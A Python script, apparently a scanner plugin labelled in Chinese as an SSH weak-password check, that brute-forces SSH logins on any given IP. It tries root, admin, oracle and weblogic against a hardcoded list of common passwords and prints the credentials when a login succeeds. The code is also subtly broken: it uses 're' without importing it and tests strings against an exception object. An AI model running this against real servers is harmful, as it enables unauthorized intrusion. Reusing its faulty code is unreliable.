#!/usr/bin/env python3
# -*- coding:utf-8 -*-

import paramiko
#paramiko.util.logging.getLogger('paramiko.transport').addHandler(paramiko.util.logging.NullHandler())

ssh_user_list = ['root', 'admin', 'oracle', 'weblogic']
ssh_passwd_list = ["123456","admin","root","password","123123","123","1","{user}","{user}{user}","{user}1","{user}123","{user}2016","{user}2015","{user}!","","password01!","root@dba","P@ssw0rd!!","qwa123","root#123","12345678","test","123qwe!@#","123456789","123321","1314520","666666","woaini","fuckyou","000000","1234567890","8888888","qwerty","1qaz2wsx","abc123","abc123456","1q2w3e4r","123qwe","159357","p@ssw0rd","p@55w0rd","password!","p@ssw0rd!","password1","123qwe!@#","123QWE!@#","!@#qwe123","123qwe!@#$","1qaz@WSX","r00t","tomcat","apache","system"]

def get_plugin_info():
    plugin_info = {
        "name": "SSH 弱口令",
        "desc": "导致敏感信息泄露，严重情况可导致服务器被入侵控制。",
        "grade": "高",
        "type": "service",
        "keyword": "service:SSH port:22",
    }
    return plugin_info

def poc(arg):
    check_port = lambda x:x if re.match(r"(.*?):(\d+)$",x) else x+':22'
    host,port = check_port(arg).split(':')
    timeout = 5
    user_list = ['root', 'admin', 'oracle', 'weblogic']
    passwd_list = ["123456","admin","root","password","123123","123","1","{user}","{user}{user}","{user}1","{user}123","{user}2016","{user}2015","{user}!","","password01!","root@dba","P@ssw0rd!!","qwa123","root#123","12345678","test","123qwe!@#","123456789","123321","1314520","666666","woaini","fuckyou","000000","1234567890","8888888","qwerty","1qaz2wsx","abc123","abc123456","1q2w3e4r","123qwe","159357","p@ssw0rd","p@55w0rd","password!","p@ssw0rd!","password1","123qwe!@#","123QWE!@#","!@#qwe123","123qwe!@#$","1qaz@WSX","r00t","tomcat","apache","system"]
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    error_i=0
    for user in user_list:
        for pass_ in passwd_list:
            passwd = pass_.replace('{user}', user)
            try:
                ssh.connect(host, int(port), user, passwd, timeout=timeout, allow_agent = False, look_for_keys = False)
                ssh.exec_command('whoami',timeout=timeout)
                if passwd == '': passwd = "null"
                return f'{arg}\t{user}/{passwd}'
            except Exception as e:
                if "Unable to connect" in e or "timed out" in e or "Bad authentication type" in e: error_i += 1
            finally:
                ssh.close()
            if error_i >= 3:return

if __name__ == '__main__':
    import sys
    if len(sys.argv) != 2:
        print("{} IP[:port]".format(sys.argv[0]))
    else:
        print("{} {}".format(sys.argv[1],poc(sys.argv[1])))  
